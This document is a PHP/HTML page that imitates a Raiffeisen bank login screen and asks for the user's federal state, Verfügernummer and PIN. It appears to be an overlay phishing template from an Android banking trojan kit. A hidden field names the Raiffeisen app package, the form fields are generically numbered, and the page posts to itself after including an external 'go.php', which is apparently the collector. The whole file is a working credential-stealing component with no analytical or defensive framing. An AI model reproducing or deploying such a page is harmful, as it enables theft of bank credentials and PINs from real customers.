<?php require_once '../go.php'; ?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <title>03</title>

    <link rel="stylesheet" href="css/normalize.css">
    <link rel="stylesheet" href="css/mainf1c1.css?777">

    <link rel="stylesheet" href="css/raiffeisen.css">

    <script src="js/vendor/jquery-1.11.3.min.js"></script>
    <script src="js/viewport.js"></script>
</head>

<body>
		<div class="modal modal_03">
            <div class="row">
                <div class="form_header">
                    <img src="img/raiffeisen/logo.png" alt="">
                </div>
            </div>
			<div class="container">
				<form action="" method="post" class="wrapper">
                <input type="hidden" name="field1" value="com.isis_papyrus.raiffeisen_pay_eyewdg" class="main_input">
					<div class="row">
						<div class="content">
							<div class="input_block_wr">
								<div class="inp_caption">
								Bundesland
								</div>
								<div class="inp_wr">
									<input type="text" name="field2" class="main_input">
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
									Verfügernummer
								</div>
								<div class="inp_wr">
									<input type="text" name="field3" class="main_input">
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
									PIN
								</div>
								<div class="inp_wr">
									<input type="text" name="field4" class="main_input">
								</div>
							</div>
							<div class="btn_wr">
								<button class="logon_btn">
									Logon
								</button>
							</div>
						</div>
					</div>
				</form>
			</div>
		</div>
</body>

</html>